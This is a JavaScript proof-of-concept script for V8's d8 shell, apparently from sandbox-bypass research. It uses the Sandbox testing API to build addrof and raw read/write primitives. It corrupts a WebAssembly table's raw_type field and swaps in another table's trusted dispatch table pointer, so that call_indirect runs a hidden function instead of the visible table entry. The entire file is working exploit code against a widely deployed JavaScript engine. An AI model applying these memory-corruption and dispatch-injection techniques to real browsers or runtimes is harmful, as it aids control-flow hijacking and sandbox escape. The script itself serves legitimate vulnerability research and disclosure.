// C21 H33: visible table entry differs from hidden dispatch target.
//
// H23 proved hidden dispatch injection: entries[1] can be a JS-visible marker
// while trusted_dispatch_table[1] still calls a donor function. This variant
// writes a valid WasmFuncRef for a different visible function into entries[1].
// Then:
//   - call_ref(table.get(1)) should execute the visible entry.
//   - call_indirect(1) uses the hidden dispatch table.
//
// If outputs differ, this is a clean integrity violation under the sandbox
// attacker model, not just a crash.

d8.file.execute('test/mjsunit/wasm/wasm-module-builder.js');

const kWeakHeapObjectTag = 3;
const kHeapObjectTag = 1;
const kFixedArrayHeaderSize = 8;
const kTaggedSize = 4;
const kTrustedDispatchTableOffset = 0x1c;
const kWasmTableObjectType =
    Sandbox.getInstanceTypeIdFor('WASM_TABLE_OBJECT_TYPE');
const kRawTypeOffset = Sandbox.getFieldOffset(kWasmTableObjectType, 'raw_type');
const kEntriesOffset = Sandbox.getFieldOffset(kWasmTableObjectType, 'entries');
const memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));

function addrof(obj) {
  return Sandbox.getAddressOf(obj) & ~kWeakHeapObjectTag;
}

function tagged(obj) {
  return Sandbox.getAddressOf(obj) + kHeapObjectTag;
}

function read32(addr) {
  return memory.getUint32(addr, true);
}

function write32(addr, val) {
  memory.setUint32(addr, val, true);
}

function rawTypeField(table) {
  return read32(tagged(table) + kRawTypeOffset - kHeapObjectTag);
}

function corruptRawType(table, rawTypeSmi) {
  Sandbox.corruptObjectField(table, 'raw_type', rawTypeSmi);
}

function entriesTagged(table) {
  return read32(tagged(table) + kEntriesOffset - kHeapObjectTag);
}

function fixedArrayElementAddr(arrayTagged, index) {
  return (arrayTagged & ~kWeakHeapObjectTag) + kFixedArrayHeaderSize +
      index * kTaggedSize;
}

function makeTargets() {
  let b = new WasmModuleBuilder();
  let sig = b.addType(kSig_i_i);
  b.addFunction('base', sig)
      .addBody([kExprLocalGet, 0, ...wasmI32Const(0x10), kExprI32Add])
      .exportFunc();
  b.addFunction('hidden', sig)
      .addBody([kExprLocalGet, 0, ...wasmI32Const(0x20), kExprI32Add])
      .exportFunc();
  b.addFunction('visible', sig)
      .addBody([kExprLocalGet, 0, ...wasmI32Const(0x70), kExprI32Add])
      .exportFunc();
  return b.instantiate().exports;
}

function makeTypedTable2(f0, f1) {
  let b = new WasmModuleBuilder();
  let sig = b.addType(kSig_i_i);
  let table = b.addTable(wasmRefNullType(sig), 2, 3).exportAs('table');
  b.addImportedGlobal('imp', 'f0', wasmRefNullType(sig), false);
  b.addImportedGlobal('imp', 'f1', wasmRefNullType(sig), false);
  b.addActiveElementSegment(
      table.index, wasmI32Const(0),
      [[kExprGlobalGet, 0], [kExprGlobalGet, 1]], wasmRefNullType(sig));
  return b.instantiate({imp: {f0, f1}}).exports.table;
}

function makeTypedTable1(f0) {
  let b = new WasmModuleBuilder();
  let sig = b.addType(kSig_i_i);
  let table = b.addTable(wasmRefNullType(sig), 1, 3).exportAs('table');
  b.addImportedGlobal('imp', 'f0', wasmRefNullType(sig), false);
  b.addActiveElementSegment(
      table.index, wasmI32Const(0), [[kExprGlobalGet, 0]],
      wasmRefNullType(sig));
  return b.instantiate({imp: {f0}}).exports.table;
}

function makeCaller(table) {
  let b = new WasmModuleBuilder();
  let sig = b.addType(kSig_i_i);
  let t = b.addImportedTable('imp', 'table', 1, 3, wasmRefNullType(sig));
  b.addFunction('call_indirect_i_i', kSig_i_ii)
      .addBody([
        kExprLocalGet, 1,
        kExprLocalGet, 0,
        kExprCallIndirect, sig, t,
      ])
      .exportFunc();
  b.addFunction('call_ref_from_table_i_i', kSig_i_ii)
      .addBody([
        kExprLocalGet, 1,
        kExprLocalGet, 0,
        kExprTableGet, t,
        kExprCallRef, sig,
      ])
      .exportFunc();
  return b.instantiate({imp: {table}}).exports;
}

let externTable = new WebAssembly.Table({element: 'externref', initial: 1});
let externRefRawTypeSmi = rawTypeField(externTable);
let {base, hidden, visible} = makeTargets();

let donor = makeTypedTable2(base, hidden);
let visibleTable = makeTypedTable1(visible);
let visibleFuncRefTagged =
    read32(fixedArrayElementAddr(entriesTagged(visibleTable), 0));

let victim = makeTypedTable1(base);
let funcrefRawTypeSmi = rawTypeField(victim);

print(`funcref_raw=0x${funcrefRawTypeSmi.toString(16)}`);
print(`externref_raw=0x${externRefRawTypeSmi.toString(16)}`);
print(`visible_funcref_tagged=0x${visibleFuncRefTagged.toString(16)}`);

write32(addrof(victim) + kTrustedDispatchTableOffset,
        read32(addrof(donor) + kTrustedDispatchTableOffset));
corruptRawType(victim, externRefRawTypeSmi);
victim.grow(2, {kind: 'placeholder'});

let victimEntries = entriesTagged(victim);
write32(fixedArrayElementAddr(victimEntries, 1), visibleFuncRefTagged);
print(`entry1_raw=0x${read32(fixedArrayElementAddr(victimEntries, 1)).toString(16)}`);

corruptRawType(victim, funcrefRawTypeSmi);
let caller = makeCaller(victim);

try {
  print(`call_ref_entry1=${caller.call_ref_from_table_i_i(1, 5)}`);
} catch (e) {
  print(`call_ref_entry1_throw=${e.name}:${e.message}`);
}

try {
  print(`call_indirect_entry1=${caller.call_indirect_i_i(1, 5)}`);
} catch (e) {
  print(`call_indirect_entry1_throw=${e.name}:${e.message}`);
}
